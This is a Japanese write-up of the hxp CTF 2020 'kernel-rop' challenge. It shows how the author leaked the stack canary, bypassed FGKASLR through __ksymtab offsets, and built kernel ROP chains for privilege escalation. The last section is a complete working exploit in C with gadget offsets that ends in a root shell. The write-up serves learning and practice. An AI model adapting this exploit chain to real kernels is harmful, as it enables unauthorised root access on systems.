keywords
kROP, FGKASLR, kernel exploit, ksymtab_xxx, rp++

![](https://i.imgur.com/dXcWXeX.png)


# イントロ
いつぞや開催された**hxp CTF 2020**。そのpwn問題である**kernel-rop**を解いていく。kernelを起動した瞬間にvulnとtopicをネタバレしていくスタイルだった。
そういえば、今月は自分の中でkernel-pwn強化月間で、解くべき問題を募集しているので、これは面白いから解いてみろとか、これは為になるから見てみろとかあったら教えてください。


# static
## basic
```basic.sh
/ $ cat /proc/version
Linux version 5.9.0-rc6+ (martin@martin) (gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0, GNU ld (GNU Binutils f0
/ $ lsmod
hackme 20480 0 - Live 0x0000000000000000 (O)
$ modinfo ./hackme.ko
filename:       /home/wataru/Documents/ctf/hxp2020/kernel-rop/work/./hackme.ko
version:        DEV
author:         Martin Radev <https://twitter.com/martin_b_radev>
description:    hackme
license:        GPL
srcversion:     838E71A30F4FFB7229182E4
depends:
retpoline:      Y
name:           hackme
vermagic:       5.9.0-rc6+ SMP mod_unload

qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```
SMEP有効・SMAP有効・KAISER有効・KASLR有効・oops!->panic

`vmlinuz`を展開して`vmlinux`にしたところ、以下のメッセージが出た。
```too-many-section.sh
$ file ./vmlinux
./vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), too many section (36140)
```
**too many section (36140)**。カーネルイメージで*too many section*といえば、**FGKASLR**である。関数毎にセクションが用意されロード時にランダマイズされるため、関数ポインタのleakの殆どが無意味になる。
```fgkaslr.sh
$ readelf -S ./vmlinux | grep kmem_cache
  [11414] .text.kmem_cache_ PROGBITS         ffffffff81643220  00843220
  [11448] .text.kmem_cache_ PROGBITS         ffffffff81644430  00844430
  [11449] .text.kmem_cache_ PROGBITS         ffffffff81644530  00844530
  [11457] .text.kmem_cache_ PROGBITS         ffffffff81644810  00844810
  [11458] .text.kmem_cache_ PROGBITS         ffffffff81644b00  00844b00
  [12494] .text.kmem_cache_ PROGBITS         ffffffff8169a1b0  0089a1b0
  [12536] .text.kmem_cache_ PROGBITS         ffffffff8169e710  0089e710
  [12537] .text.kmem_cache_ PROGBITS         ffffffff8169eb80  0089eb80
  [12540] .text.kmem_cache_ PROGBITS         ffffffff8169f240  0089f240
  [12541] .text.kmem_cache_ PROGBITS         ffffffff8169f6b0  0089f6b0
  [12553] .text.kmem_cache_ PROGBITS         ffffffff816a0f70  008a0f70
  [12557] .text.kmem_cache_ PROGBITS         ffffffff816a15b0  008a15b0
  [12559] .text.kmem_cache_ PROGBITS         ffffffff816a1a00  008a1a00
  [12561] .text.kmem_cache_ PROGBITS         ffffffff816a2020  008a2020
```

## Module
おい、ソースないやんけ。その理由を書いた嘆願書も添付されてないやんけ。
*hackme*という名前の`miscdevice`が登録される。
![](https://i.imgur.com/IS3atug.png)

実装されている操作は*open/release/read/write*の4つ。さてリバースをしようと思いGhidraを開いたら、**Ghidra君が全ての関数をデコンパイルすることを放棄してしまった。。。** これ、たまにある事象なので今度原因を調べる。それかIDAも使えるようにしておく。
![](https://i.imgur.com/y2R8dzj.png)
  
まぁアセンブリを読めばいいだけなので問題はない。`read/write`はおおよそ以下の疑似コードのようなことをしている。
```read-write.c
write(struct file *filp, char *data, size_t size, loff_t off){
    if(size <= 0x1000){
        __check_object_size(hackme_buf, size, 0);
        if(_copy_from_user(hackme_buf, buf, sizse)){
            return -0xE;
        }
        memcpy($rsp-0x98, hackme_buf, size); // <-- VULN: なにしてんのお前？？？
        __stack_chk_fail();
    }else{
        _warn_printk("Buffer_overflow_detected_(%d_<_%u)!", 0x1000, size);
        __stack_chk_fail(); // canary @ $rbp-0x18
        return -0xE;
    }
}
read(struct file *filp, char *data, size_t size){
    memcpy(hackme_buf, $rsp-0x98, size);    // <-- VULN: not initialized...
    __check_object_size(hackme_buf, size, 1);
    if(_copy_to_user(data, hackme_buf, size)){
        return -0xE;
    }
    __stack_chk_fail(); // canary @ $rbp-0x18
}
```

なんかもう、意味分からんことしてるな。FGKASLRのせいでGDBの表示もイカれてるし、しまいにはAbortしたわ。。。
![](https://i.imgur.com/tWZzVFF.png)

まぁそれはいいとして、`hackme_write()`では`hackme_buf`に読んだデータを、`$rsp-0x98`へと`memcpy()`している。この際のサイズ制限は`0x1000`であるが、これだけのデータをスタックにコピーすると当然崩壊してしまう。だが、`$rsp-0x18`にカナリアが飼われており、これを崩さないようにしないとOopsする。また、`hackme_read()`においては`$rsp-0x98`からのデータを`hackme_buf`にコピーし、そのあとで`hackme_buf`をユーザランドにコピーしている。

# Vuln
上のコードからも分かるとおり、スタックがかなりいじれる(R/W)。
![](https://i.imgur.com/qe6OcIR.png)

# leak canary
カナリアが飼われているものの、`hackme_read()`のチェックがガバガバのため、readに関しては思うがままにでき、よって容易にカナリアをleakできる。
```canary-leak.c
/** snippet **/
  _read(fd, rbuf, 0x90);
  printf("[+] canary: %lx\n", ((ulong*)rbuf)[0x80/8]);
  
/** result **/
/ # /tmp/exploit
[+] canary: 32ce1536acf87a00
/ #
```

# kROP
これでcanaryがleakできたため、スタックを任意に書き換えることができるようになった。SMEP/SMAPともに有効であるから、ユーザランドに飛ばすことはできない。また、FGKASLRが有効のためガジェットの位置がなかなか定まらない。FGKASLRが有効でもデータセクション及び一部の関数はランダマイズされないことは知っているが、そういったシンボルをどうやって見つければいいか分からなかった。

## __ksymtab_xxx
ここで[author's writeup](https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/)をカンニング。
`__ksymtab_xxx`エントリをleakすればいいらしい。そこで試しに`kmem_cache_alloc()`の情報を以下に挙げる。
```kmem_cache_alloc_info.sh
kernbase: 0xffffffff81000000
kmem_cache_create: 0xffffffff81644b00
__ksymtab_kmem_cache_create: 0xffffffff81f8b4b0
__kstrtab_kmem_cache_create: 0xffffffff81fa61ea

(gdb) x/4wx $ksymtab_kmem_cache_create
0xffffffff81f8b4b0:     0xff6b9650      0x0001ad36      0x0001988a
```
僕は`__ksymtab_xxx`各エントリには、シンボルのアドレス・`__kstrtab_xxx`へのポインタ・ネームスペースへのポインタがそれぞれ0x8byteで入っているものと思っていたが、上を見る感じそうではない。どうやら、KASLRが利用できるarchにおいては、[このパッチ](https://patchwork.kernel.org/project/linux-arm-kernel/patch/20180626182802.19932-4-ard.biesheuvel@linaro.org/)でアドレスの代わりにオフセットを入れるようになったらしい。シンボルの各エントリは以下の構造を持ち、以下のようにして解決される。
```include/linux/export.h
#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
#include <linux/compiler.h>
(snipped...)
#define __KSYMTAB_ENTRY(sym, sec)					\
	__ADDRESSABLE(sym)						\
	asm("	.section \"___ksymtab" sec "+" #sym "\", \"a\"	\n"	\
	    "	.balign	4					\n"	\
	    "__ksymtab_" #sym ":				\n"	\
	    "	.long	" #sym "- .				\n"	\
	    "	.long	__kstrtab_" #sym "- .			\n"	\
	    "	.long	__kstrtabns_" #sym "- .			\n"	\
	    "	.previous					\n")

struct kernel_symbol {
	int value_offset;
	int name_offset;
	int namespace_offset;
};
#else
```
```kernel/module.c
static unsigned long kernel_symbol_value(const struct kernel_symbol *sym)
{
#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
	return (unsigned long)offset_to_ptr(&sym->value_offset);
#else
	return sym->value;
#endif
}

static const char *kernel_symbol_name(const struct kernel_symbol *sym)
{
#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
	return offset_to_ptr(&sym->name_offset);
#else
	return sym->name;
#endif
}
```
```include/linux/compiler.h
static inline void *offset_to_ptr(const int *off)
{
	return (void *)((unsigned long)off + *off);
}
```
要は、そのエントリのアドレスに対してそのエントリの持つ値を足してやれば、そのエントリの示すシンボルのアドレス、および`__kstrtab_xxx`のアドレスになるというわけである。そして、幸いなことにこのエントリ達はreadableなデータであり、FGKASLRの影響を受けない(KASLRの影響は受ける)。よって、この`__ksymtab_xxx`のアドレス、厳密にはこの配列のインデックスも固定であるためその内のどれか(一番最初のエントリは`ffffffff81f85198 r __ksymtab_IO_APIC_get_PCI_irq_vector`)が分かればFGKASLRを完全に無効化したことになる。

## find not-randomized pointer to leak kernbase
だがまだ進捗は全く出ていない。この`__ksymtab_xxx`のアドレス自体を決定する必要がある。今回は最初スタックからしかleakできないため、このstackをとにかく血眼になって**FGKASLRの影響を受けていないポインタを探す**。以下のように、`$RSP-38*0x8`にあるポインタがKASLR有効の状態で何回か試しても影響を受けていなかった。
![](https://i.imgur.com/JerhJbI.png)

これで、kernbaseのリークができたことになる。すなわち、`__ksymtab_xxx`の全てのアドレスもleakできたことになる。　

## find gadget to leak the data of __ksymtab_xxx
さて、`__ksymtab_xxx`のアドレスが分かったが、今度はこの中身を抜くためのガジェットが必要になる。このガジェットも勿論、FGKASLRの影響を受けないような関数から取ってこなくてはならない。**ROP問って、ただガジェット探す時間が多くなるから嫌い**。。。
ということで、 **rp++** のラッパーとしてFGKASLRに影響されないようなガジェットを探してくれるシンプルツールを書きました。まだまだバグだらけだけど、ゼロから探すよりかは8億倍楽だと思う。
https://github.com/smallkirby/kernelpwn/tree/master/tools

これを使うと、以下のような感じでFGKASLRの影響を受けないシンボルだけを探してくれて。
![](https://i.imgur.com/jBITlkf.png)
実際に、これはFGKASLRの影響を受けていないことが分かる。こうなればあとは、ただのkROP問題だ。
![](https://i.imgur.com/ST88Q7X.png)

これを使って、gadgetを探して以下のようなchainを組んだ。
```chain-to-leak-ksymtab.asm
  // leak symbols from __ksymtab_xxx
  save_state();
  ulong *c = &wbuf[CANARY_OFF];
  memset(wbuf, 'A', 0x200);
  *c++ = canary;
  *c++ = '1'; // rbx
  *c++ = '2'; // r12
  *c++ = '3'; // rbp
  *c++ = kernbase + 0x4D11; // pop rax
  *c++ = kernbase + 0xf87d90; // __ksymtab_commit_creds
  *c++ = kernbase + 0x015a80; // mov eax, dword[rax]; pop rbp;
  *c++ = 'A'; // rbp
  *c++ = kernbase + 0x200f23; // go home(swapgs & iretq)
  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
    *c++ = 'A' + ix + 1;
  *c++ = &NIRUGIRI;
  *c++ = user_cs;
  *c++ = user_rflags;
  *c++ = user_sp;
  *c++ = user_ss;
  _write(fd, wbuf, 0x130);
```
すると、`iretq`の直前には以下のようになって、ちゃんとこと`NIRUGIRI()`に帰れることがわかる。(因みに、なんでか上手くユーザランドに帰れなくて小一時間ほど時間を浪費してしまったが、結局`_write()`で書き込むバイト数が足りておらず、`user_ss`等を書き込めていなかったことが原因だった)
![](https://i.imgur.com/4Gn15ia.png)

但し、まだNIRUGIRIをするには早すぎる。一回のkROPでできることは一つのleakだけだから、これを複数回繰り返してleakを行う。具体的にはleakするシンボルは、`commit_creds`と`prepare_kernel_commit`である。`current_task`に関してはFGKASLRの影響を受けないため問題ない。

# get ROOT
上の方法で`commit_creds()`と`prepare_kernel_commit()`をleakしたら、同様に **neorop++** でFGKASLRに影響されないガジェットを探し、あとは全く同じ方法で`commit_creds(prepare_kernel_commit(0))`をするだけである。最後の着地点はユーザランドのシェルを実行する関数にすれば良い。`

# exploit
```exploit.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


// commands
#define DEV_PATH "/dev/hackme"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define REP(N) for(int iiiiix=0;iiiiix!=N;++iiiiix)
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  printf("[!!!] NIRUGIRI!!!\n");
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
  printf("[+] save_state: cs:%lx ss:%lx sp:%lx rflags:%lx\n", user_cs, user_ss, user_sp, user_rflags);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

// hackme
int _write(int fd, char *buf, uint size){
  assert(fd > 0);
  int res = write(fd, buf, size);
  assert(res >= 0);
  return res;
}
int _read(int fd, char *buf, uint size){
  assert(fd > 0);
  int res = read(fd, buf, size);
  assert(res >= 0);
  return res;
}
// (END hackme)

#define CANARY_OFF 0x80
#define RBP_OFF 0x98
int fd;
ulong kernbase;
ulong commit_creds, prepare_kernel_cred, current_task;
ulong canary;
char rbuf[0x200];
char wbuf[0x200];

void level3(void){
  ulong ret;
  asm(
      "movq %0, %%rax\n"
      : "=r"(ret)
  );
  const ulong my_special_cred = ret;
  printf("[!] reached Level-3\n");
  printf("[!] my_special_cred: 0x%lx\n", my_special_cred);

  // into level4
  save_state();
  ulong *c = &wbuf[CANARY_OFF];
  memset(wbuf, 'A', 0x200);
  *c++ = canary;
  *c++ = '1'; // rbx
  *c++ = '2'; // r12
  *c++ = '3'; // rbp
  *c++ = kernbase + 0x006370; // pop rdi
  *c++ = my_special_cred;
  *c++ = commit_creds;
  *c++ = kernbase + 0x200f23; // go home(swapgs & iretq)
  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
    *c++ = 'A' + ix + 1;
  *c++ = &NIRUGIRI;
  *c++ = user_cs;
  *c++ = user_rflags;
  *c++ = user_sp;
  *c++ = user_ss;
  _write(fd, wbuf, 0x130);

  errExit("level3");
}

void level2(void){
  ulong ret;
  asm(
      "movq %0, %%rax\n"
      : "=r"(ret)
  );
  prepare_kernel_cred = (signed long)kernbase + (signed long)0xf8d4fc + (signed int)ret;
  printf("[!] reached Level-2\n");
  printf("[!] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);

  // into level3
  save_state();
  ulong *c = &wbuf[CANARY_OFF];
  memset(wbuf, 'A', 0x200);
  *c++ = canary;
  *c++ = '1'; // rbx
  *c++ = '2'; // r12
  *c++ = '3'; // rbp
  *c++ = kernbase + 0x006370; // pop rdi
  *c++ = 0;
  *c++ = prepare_kernel_cred;
  *c++ = kernbase + 0x200f23; // go home(swapgs & iretq)
  printf("[!!!] 0x%lx\n", *(c-1));;
  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
    *c++ = 'A' + ix + 1;
  *c++ = &level3;
  *c++ = user_cs;
  *c++ = user_rflags;
  *c++ = user_sp;
  *c++ = user_ss;
  _write(fd, wbuf, 0x130);

  errExit("level2");
}

void level1(void){
  ulong ret;
  asm(
      "movq %0, %%rax\n"
      : "=r"(ret)
  );
  commit_creds = (signed long)kernbase + (signed long)0xf87d90 + (signed int)ret;
  printf("[!] reached Level-1\n");
  printf("[!] commit_creds: 0x%lx\n", commit_creds);

  // into level2
  save_state();
  ulong *c = &wbuf[CANARY_OFF];
  memset(wbuf, 'A', 0x200);
  *c++ = canary;
  *c++ = '1'; // rbx
  *c++ = '2'; // r12
  *c++ = '3'; // rbp
  *c++ = kernbase + 0x4D11; // pop rax
  *c++ = kernbase + 0xf8d4fc; // __ksymtab_prepare_kernel_cred
  *c++ = kernbase + 0x015a80; // mov eax, dword[rax]; pop rbp;
  *c++ = 'A'; // rbp
  *c++ = kernbase + 0x200f23; // go home(swapgs & iretq)
  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
    *c++ = 'A' + ix + 1;
  *c++ = &level2;
  *c++ = user_cs;
  *c++ = user_rflags;
  *c++ = user_sp;
  *c++ = user_ss;
  _write(fd, wbuf, 0x130);

  errExit("level1");
}

int main(int argc, char *argv[]) {
  printf("[.] NIRUGIRI @ %p\n", &NIRUGIRI);
  printf("[.] level1 @ %p\n", &level1);
  memset(wbuf, 'A', 0x200);
  memset(rbuf, 'B', 0x200);
  fd = open(DEV_PATH, O_RDWR);
  assert(fd > 0);

  // leak canary and kernbase
  _read(fd, rbuf, 0x1a0);
  canary = ((ulong*)rbuf)[0x10/8];
  printf("[+] canary: %lx\n", canary);
  kernbase = ((ulong*)rbuf)[38] - ((ulong)0xffffffffb080a157 - (ulong)0xffffffffb0800000);
  printf("[!] kernbase: 0x%lx\n", kernbase);

  // leak symbols from __ksymtab_xxx
  save_state();
  ulong *c = &wbuf[CANARY_OFF];
  memset(wbuf, 'A', 0x200);
  *c++ = canary;
  *c++ = '1'; // rbx
  *c++ = '2'; // r12
  *c++ = '3'; // rbp
  *c++ = kernbase + 0x4D11; // pop rax
  *c++ = kernbase + 0xf87d90; // __ksymtab_commit_creds
  *c++ = kernbase + 0x015a80; // mov eax, dword[rax]; pop rbp;
  *c++ = 'A'; // rbp
  *c++ = kernbase + 0x200f23; // go home(swapgs & iretq)
  for(int ix=0; ix!=5; ++ix) // rcx, rdx, rsi, rdi, none
    *c++ = 'A' + ix + 1;
  *c++ = &level1;
  *c++ = user_cs;
  *c++ = user_rflags;
  *c++ = user_sp;
  *c++ = user_ss;
  _write(fd, wbuf, 0x130);

  errExit("main");
  return 0;
}

/* gad go home
ffffffff81200f23:       59                      pop    rcx
ffffffff81200f24:       5a                      pop    rdx
ffffffff81200f25:       5e                      pop    rsi
ffffffff81200f26:       48 89 e7                mov    rdi,rsp
ffffffff81200f29:       65 48 8b 24 25 04 60    mov    rsp,QWORD PTR gs:0x6004
ffffffff81200f30:       00 00
ffffffff81200f32:       ff 77 30                push   QWORD PTR [rdi+0x30]
ffffffff81200f35:       ff 77 28                push   QWORD PTR [rdi+0x28]
ffffffff81200f38:       ff 77 20                push   QWORD PTR [rdi+0x20]
ffffffff81200f3b:       ff 77 18                push   QWORD PTR [rdi+0x18]
ffffffff81200f3e:       ff 77 10                push   QWORD PTR [rdi+0x10]
ffffffff81200f41:       ff 37                   push   QWORD PTR [rdi]
ffffffff81200f43:       50                      push   rax
ffffffff81200f44:       eb 43                   jmp    ffffffff81200f89 <_stext+0x200f89>
ffffffff81200f46:       0f 20 df                mov    rdi,cr3
ffffffff81200f49:       eb 34                   jmp    ffffffff81200f7f <_stext+0x200f7f>
*/
```

# アウトロ
![](https://i.imgur.com/gjpPF6Q.png)

FGKASLRをkROPでbypassする、為になる良い問題でした。


# symbols without KASLR
```symbols.txt
hackme_buf: 0xffffffffc0002440
```
信じられるものは、.bss/.dataだけ。アンパンマンと一緒だね。


# 参考
author's writeup
https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/
ニルギリ
https://youtu.be/yvUvamhYPHw
